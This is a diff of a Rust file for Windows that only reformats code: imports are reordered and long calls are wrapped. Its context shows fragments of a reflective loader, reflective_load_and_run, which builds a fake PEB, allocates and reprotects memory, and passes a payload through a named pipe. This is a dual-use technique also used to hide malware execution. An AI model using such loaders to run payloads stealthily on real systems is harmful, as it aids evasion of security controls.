@@ -1,18 +1,13 @@
 #![allow(unsafe_op_in_unsafe_fn)]
-use std::ptr::null_mut;
 use crate::win32::Win32::Foundation::*;
 use crate::win32::Win32::Storage::FileSystem::*;
 use crate::win32::Win32::System::Diagnostics::Debug::*;
 use crate::win32::Win32::System::Environment::*;
 use crate::win32::Win32::System::LibraryLoader::*;
-use crate::win32::Win32::System::Memory::{
-    VirtualAlloc,
-    VirtualProtect,
-    MEM_COMMIT,
-    MEM_RESERVE,
-};
+use crate::win32::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, VirtualAlloc, VirtualProtect};
 use crate::win32::Win32::System::Pipes::*;
 use crate::win32::Win32::System::Threading::*;
+use std::ptr::null_mut;
 
 #[repr(C)]
 pub struct FakePeb {
@@ -328,7 +323,13 @@ pub unsafe fn reflective_load_and_run(washmhost: &[u8], payload: &[u8]) -> ! {
         let h = pipe_handle as HANDLE;
         ConnectNamedPipe(h, null_mut());
         let mut written = 0;
-        WriteFile(h, pl.as_ptr() as *const _, pl.len() as u32, &mut written, null_mut());
+        WriteFile(
+            h,
+            pl.as_ptr() as *const _,
+            pl.len() as u32,
+            &mut written,
+            null_mut(),
+        );
         CloseHandle(h);
     });
 
@@ -460,7 +461,11 @@ pub unsafe fn reflective_load_and_run(washmhost: &[u8], payload: &[u8]) -> ! {
             image_base as usize as u64,
         );
         #[cfg(target_arch = "aarch64")]
-        RtlAddFunctionTable(pdata_ptr as *const _, pdata_count, image_base as usize as u64);
+        RtlAddFunctionTable(
+            pdata_ptr as *const _,
+            pdata_count,
+            image_base as usize as u64,
+        );
     }
 
     // VirtualProtect
